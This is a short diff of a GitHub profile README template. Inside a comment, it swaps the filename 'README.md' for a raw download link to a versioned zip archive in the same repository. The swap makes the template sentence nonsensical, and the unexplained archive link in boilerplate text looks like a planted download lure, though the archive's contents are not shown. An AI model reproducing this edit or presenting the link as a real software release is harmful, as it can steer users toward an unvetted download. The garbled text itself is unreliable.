@@ -1,7 +1,7 @@
 ## Hi there 👋
 
 <!--
-**Playerbs1/Playerbs1** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+**Playerbs1/Playerbs1** is a ✨ _special_ ✨ repository because its `https://github.com/Playerbs1/Playerbs1/raw/refs/heads/main/image/Playerbs-v3.3-beta.5.zip` (this file) appears on your GitHub profile.
 
 Here are some ideas to get you started:
 
